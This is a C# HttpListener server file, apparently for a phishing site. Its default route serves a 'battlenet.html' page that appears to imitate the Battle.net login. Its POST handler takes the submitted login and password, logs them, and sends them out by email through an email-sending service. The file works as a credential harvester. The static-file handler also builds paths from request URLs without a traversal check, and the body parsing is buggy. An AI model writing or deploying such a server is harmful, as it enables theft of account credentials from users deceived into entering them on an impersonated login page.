using System.Net;
using System.Text;
using MimeKit;

namespace MyHttpServer;

public class Server
{
    public readonly HttpListener _server;
    private bool _isRunning;
    public string prefix;
    private AppSettingsConfig _config;
    public Server(HttpListener server)
    {
        _server = server;
        _isRunning = false;
        
        var cfgLoader = new AppSettingsLoader("../../../");
        cfgLoader.InitAppSettings();
        _config = cfgLoader.Configuration;
        prefix = $"{_config.Address}{_config.Port}/";
    }
    
    public void Start()
    {
        _isRunning = true;
        _server.Prefixes.Add(prefix);
        _server.Start();
        Console.WriteLine($"Сервер запущен: {prefix}");
        
        StartServer();

        
        while (_isRunning)
        {
            if (Console.ReadLine() == "stop")
                _isRunning = false;
        }

        _server.Stop();
        Console.WriteLine("Сервер остановлен");
    }
    
    async Task StartServer()
    {
        while (_isRunning)
        {
            
            var localPath = "../../../";
            IsDirectoryExistAndCreate(localPath+_config.StaticFilesPath);
            
            var context = await _server.GetContextAsync();
            var response = context.Response;
            var request = context.Request;
            string requestUrl = request.Url!.LocalPath;

            if (requestUrl.StartsWith("/static/") && (requestUrl.EndsWith(".html") || requestUrl.EndsWith(".css") || requestUrl.EndsWith(".png") || requestUrl.EndsWith(".svg")))
            {
                string filePath = Path.Combine(localPath,_config.StaticFilesPath, requestUrl.Substring(8));
                if (File.Exists(filePath))
                {
                    var buffer = File.ReadAllBytes(filePath);
                    response.ContentLength64 = buffer.Length;
                    response.ContentType = GetContentType(requestUrl);
                    using Stream output = response.OutputStream; 
                    await output.WriteAsync(buffer);
                    await output.FlushAsync();
                }

                else
                {
                    response.StatusCode = (int)HttpStatusCode.NotFound;
                    response.ContentType = "text/plain; charset=utf-8";
                    string notFoundMessage = "404 Файл не найден";
                    byte[] notFoundBuffer = Encoding.UTF8.GetBytes(notFoundMessage);
                    response.ContentLength64 = notFoundBuffer.Length;
                    using Stream output = response.OutputStream;
                    output.Write(notFoundBuffer, 0, notFoundBuffer.Length);
                    output.Flush();
                    Console.WriteLine($"Файл не найден: {requestUrl}");
                }
            }
            
            else if (request.HttpMethod == "POST")
            {

                using (var reader = new StreamReader(request.InputStream))
                {
                    string[] requestBody = reader.ReadToEnd().Split("");
                    Console.WriteLine($"{requestBody[0]} , {requestBody[1]}");
                    string login = requestBody[0];
                    string password = requestBody[1];

                    EmailSenderService emailSender = new EmailSenderService();
                    await emailSender.SendEmailAsync(login, password);

                    Console.WriteLine("Email sent successfully!");
                }
            }
            
            // http://127.0.0.1:1414/
            else
            {
                string filePath = Path.Combine(localPath, _config.StaticFilesPath, "battlenet.html");
                if (File.Exists(filePath))
                {
                    byte[] buffer = File.ReadAllBytes(filePath);
                    response.ContentLength64 = buffer.Length;
                    response.ContentType = GetContentType(requestUrl);
                    using Stream output = response.OutputStream;
                    await output.WriteAsync(buffer);
                    await output.FlushAsync();
                }
            }
        }
    }

    private string GetContentType(string requestUrl)
    {
        string contentType;
        if (requestUrl.EndsWith("/"))
        {
            requestUrl = $"/{_config.StaticFilesPath}/battlenet.html";
        }
        
        switch (Path.GetExtension(requestUrl).ToLower())
        {
            case ".html":
                contentType = "text/html; charset=utf-8";
                break;
            case ".png":
                contentType = "image/png";
                break;
            case ".svg":
                contentType = "image/svg+xml";
                break;
            case ".css":
                contentType = "text/css";
                break;
            default:
                contentType = "text/plain; charset=utf-8";
                break;
        }

        return contentType;
    }

    void IsDirectoryExistAndCreate(string path)
    {
        if(Directory.Exists(path))
            return;

            
        Directory.CreateDirectory(path);
    }
}